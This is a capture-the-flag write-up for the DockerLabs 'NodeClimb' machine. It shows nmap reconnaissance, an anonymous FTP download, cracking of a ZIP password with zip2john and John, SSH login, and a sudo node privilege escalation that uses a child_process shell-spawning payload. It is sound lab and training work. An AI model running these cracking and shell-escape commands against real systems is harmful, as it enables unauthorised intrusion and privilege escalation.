# NodeClimb — DockerLabs Write-up

**Platform:** DockerLabs (https://dockerlabs.es/)  
**Difficulty:** Easy  
**Date:** 08/05/2026  
**OS:** Linux  
**Techniques:** Anonymous FTP, zip2john, John the Ripper, sudo node GTFOBins

---

## Reconnaissance

Full Nmap scan to detect open ports, versions and default scripts:

```bash
sudo nmap -sS -sV -sC -T4 -oA nmap_nodeclimb <IP>
```

![Nmap scan](DockerLabs/NodeClimb/assets/3.png)

Results:

|Port|State|Service|
|---|---|---|
|21/tcp|open|FTP (vsftpd 3.0.3)|
|22/tcp|open|SSH (OpenSSH)|

The Nmap script confirms that FTP allows **anonymous login** and lists a file called `secretitopicaron.zip`.

---

## Anonymous FTP Access

Connected to FTP using `lftp` with anonymous credentials:

```bash
lftp 172.17.0.2
login anonymous
ls
```

![Anonymous FTP](DockerLabs/NodeClimb/assets/1.png)

Downloaded the file `secretitopicaron.zip`:

```bash
get secretitopicaron.zip
```

---

## ZIP Cracking with zip2john + John

The ZIP is password protected. The hash is extracted with `zip2john` and cracked with John using the `rockyou` wordlist:

```bash
zip2john secretitopicaron.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![zip2john and hash](DockerLabs/NodeClimb/assets/4.png)

John finds the password:

![John cracked](DockerLabs/NodeClimb/assets/6.png)

The ZIP is then extracted:

```bash
unzip secretitopicaron.zip
cat password.txt
```

![Credentials](DockerLabs/NodeClimb/assets/5.png)

The `password.txt` file contains cleartext credentials: **username and password**.

---

## SSH Access

Using the obtained credentials to log in via SSH:

```bash
ssh mario@172.17.0.2
```

---

## Privilege Escalation — sudo node (GTFOBins)

Once inside, checking what the user can run with sudo:

```bash
sudo -l
```

The user can run a Node.js script with `sudo` and no password. Checking [GTFOBins — node](https://gtfobins.github.io/gtfobins/node/), the script is edited to spawn a root shell:

```bash
nano script.js
```

Payload inserted:

```javascript
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

![Node payload](DockerLabs/NodeClimb/assets/2.png)

Script executed with sudo:

```bash
sudo node script.js
```

Shell obtained as **root**.

---

## Tools Used

|Tool|Purpose|
|---|---|
|Nmap|Port and service reconnaissance|
|lftp|FTP client|
|zip2john|Hash extraction from password-protected ZIP|
|John the Ripper|Hash cracking with rockyou wordlist|
|GTFOBins|Reference for privilege escalation via node|

---

## Lessons Learned

- `zip2john` extracts the hash from an encrypted ZIP in a format compatible with John.
- Node.js's `child_process` module can spawn shells — if a script can be run with sudo, it's a direct privesc vector.
- Anonymous FTP remains a critical finding in any real-world audit.
